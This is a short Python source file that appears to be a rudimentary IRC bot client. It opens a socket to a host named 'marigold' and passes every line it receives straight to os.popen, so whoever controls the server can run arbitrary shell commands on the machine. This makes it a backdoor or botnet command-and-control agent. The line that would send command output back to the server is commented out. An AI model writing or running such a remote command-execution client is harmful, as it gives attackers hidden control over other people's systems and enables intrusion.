import os
import sys
import ssl
import socket

class IRC_Connector(object):
	def __init__(self, server, port):
		self.server = server
		self.port = port
	
	def connect(self): 
		# Create a socket to the irc server, via 
		self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
			# Attempting to connect, and making a sockfile.
			self._sock.connect((self.server, self.port))
			self._sockfile = self._sock.makefile()

			print("Socket: {}".format(self._sock))
		except:
			print("Unable to connect to {} on port {}".format(self.server, self.port))
	

	# Send the message on the socket.
	def send(self, msg):
		self._sockfile.write("{}\n".format(msg))
		self._sockfile.flush()

	# Recieve a string from the socket
	def recieve(self):
		data = self._sockfile.readline()
		return data

class IRC_Bot(object):
	# When the buffer on the server is flushed (ie: A message is sent over the socket),
	# execute the result and send the output back over the socket
	def respond(self):
		fh = os.popen(self.cmd)
		#self.conn.send(fh.read())
		print(fh.read())

	# Listen for commands, and execute them as they come in
	def run(self):

		while(self.cmd != "exit"):
			self.cmd = self.conn.recieve()

			if(self.cmd != ""):
				print("Recieved command: [{}]".format(self.cmd))
				self.respond()

	def __init__(self, server, port):
		self.conn = IRC_Connector(server, port)
		self.conn.connect()
		self.cmd = ""
			

bot = IRC_Bot("marigold", int(sys.argv[1]))
bot.run()
